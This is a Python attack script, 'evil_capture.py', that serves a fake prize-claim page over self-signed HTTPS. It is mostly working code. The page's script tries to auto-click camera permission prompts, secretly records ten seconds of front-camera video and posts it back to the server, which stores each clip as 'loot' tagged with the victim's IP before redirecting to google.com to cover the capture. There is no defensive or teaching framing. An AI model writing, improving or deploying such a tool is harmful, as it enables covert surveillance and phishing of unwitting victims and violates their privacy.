#!/usr/bin/env python3
# evil_capture.py → FINAL ARMOR v2.1: 10s Video + Auto-Allow + Silent Loot
import http.server
import socketserver
import urllib.parse
import base64
import os
import ssl
from datetime import datetime

PORT = 8443
CERT_FILE = "server.pem"
DIR = "ARMOR_LOOT"
os.makedirs(DIR, exist_ok=True)

# === SELF-SIGNED CERT ===
if not os.path.exists(CERT_FILE):
    os.system(f"openssl req -new -x509 -days 365 -nodes -out {CERT_FILE} -keyout {CERT_FILE} -subj '/CN=localhost' 2>/dev/null")

# === JS: DIALOG HUNTER + 10s VIDEO + ROBUST SEND ===
PAYLOAD = """<script>
// === AUTO-CLICK "ALLOW" / "THIS TIME" ON MOBILE ===
const huntDialog = () => {
  const root = document.body || document.documentElement;
  const nodes = root.querySelectorAll('*');
  for (let node of nodes) {
    const txt = (node.textContent || '').toLowerCase();
    if (/camera|microphone|allow|this time|while using/i.test(txt)) {
      const btns = node.querySelectorAll('button, [role="button"], div[role="button"]');
      for (let b of btns) {
        const bt = (b.textContent || '').toLowerCase();
        if (/allow|this time|ok|yes|continue/i.test(bt)) {
          b.click();
          console.log('[ARMOR] Auto-allowed:', bt);
          return true;
        }
      }
      if (node.click) { node.click(); return true; }
    }
  }
  return false;
};
const hunt = setInterval(() => { if (huntDialog()) clearInterval(hunt); }, 80);

// === VIDEO CAPTURE (10s WEBM) ===
let recorder, chunks = [];
const video = document.createElement('video');
video.muted = true; video.style.display = 'none';
document.body.appendChild(video);

const startCapture = () => {
  navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: false})
    .then(stream => {
      console.log('[ARMOR] Stream granted');
      video.srcObject = stream;
      video.play();

      recorder = new MediaRecorder(stream, {mimeType: 'video/webm;codecs=vp9'});
      recorder.ondataavailable = e => {
        if (e.data.size > 0) chunks.push(e.data);
      };
      recorder.onstop = () => setTimeout(sendLoot, 500);
      recorder.start();

      setTimeout(() => {
        if (recorder.state === 'recording') recorder.stop();
        stream.getTracks().forEach(t => t.stop());
      }, 10000);
    })
    .catch(err => {
      console.error('[ARMOR] DENIED:', err.name);
      clearInterval(hunt);
      setTimeout(() => location = 'https://google.com', 800);
    });
};

// === SEND LOOT ===
const sendLoot = () => {
  if (!chunks.length && recorder && recorder.state !== 'inactive') {
    recorder.requestData();
  }

  setTimeout(() => {
    const blob = new Blob(chunks, {type: 'video/webm'});
    if (blob.size < 1000) {
      console.log('[ARMOR] Blob too small:', blob.size);
      setTimeout(() => location = 'https://google.com', 500);
      return;
    }

    const reader = new FileReader();
    reader.onload = () => {
      let b64 = reader.result.split(',')[1];
      b64 = b64.replace(/[^A-Za-z0-9+/=]/g, '');
      b64 += '='.repeat((4 - b64.length % 4) % 4);

      fetch(location.href, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'vid=' + encodeURIComponent(b64)
      }).then(() => {
        console.log('[ARMOR] VIDEO SENT:', blob.size, 'bytes');
      }).finally(() => {
        setTimeout(() => location = 'https://google.com', 600);
      });
    };
    reader.readAsDataURL(blob);
  }, 500);
};

// === START ON LOAD ===
window.addEventListener('load', () => {
  setTimeout(startCapture, 1200);
});
</script>"""

BUTTON_JS = """<script>
document.getElementById('claimBtn').onclick = () => {
  this.innerText = 'Recording...';
  this.disabled = true;
};
</script>"""

HTML_TEMPLATE = """<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Claim Your Prize</title>
  <style>
    body{{font-family:Arial;background:#fff3e0;color:#d84315;text-align:center;padding:10%}}
    .box{{background:#fff;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:90%;margin:auto}}
    h1{{font-size:2rem}}
    p{{font-size:1.1rem;margin:1.5rem 0}}
    button{{background:#ff6d00;color:#fff;border:none;padding:1rem 2rem;font-size:1.2rem;border-radius:12px;font-weight:bold}}
    button:disabled{{background:#ccc;cursor:not-allowed}}
  </style>
</head><body>
  <div class="box">
    <h1>Exclusive Prize!</h1>
    <p>Allow camera to record your reaction.</p>
    <button id="claimBtn">Start Recording</button>
  </div>
  {payload}
  {button_js}
</body></html>"""

class ArmorHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        html = HTML_TEMPLATE.format(payload=PAYLOAD, button_js=BUTTON_JS)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode('utf-8', errors='ignore')
            params = urllib.parse.parse_qs(data)
            raw = params.get('vid', [''])[0]

            if not raw:
                print(f"[-] No 'vid=' from {self.client_address[0]}")
                self._redirect()
                return

            b64 = urllib.parse.unquote(raw).strip().replace(' ', '+')
            b64 += '=' * (-len(b64) % 4)
            b64 = ''.join(c for c in b64 if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')

            if len(b64) < 1000:
                print(f"[-] Video too small ({len(b64)} chars) from {self.client_address[0]}")
                self._redirect()
                return

            vid_bytes = base64.b64decode(b64, validate=False)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            ip = self.client_address[0]
            path = f"{DIR}/ARMOR_{ts}_{ip}.webm"
            with open(path, "wb") as f:
                f.write(vid_bytes)
            print(f"[+] VIDEO ARMOR SAVED: {path} ({len(vid_bytes)} bytes)")

        except Exception as e:
            print(f"[-] ERROR: {e}")
        finally:
            self._redirect()

    def _redirect(self):
        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

def run():
    server = socketserver.TCPServer(("", PORT), ArmorHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_FILE)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    print(f"ARMOR v2.1 LIVE → https://YOUR_IP:{PORT}")
    print(f"   LOOT → ./{DIR}/*.webm")
    server.serve_forever()

if __name__ == "__main__":
    run()
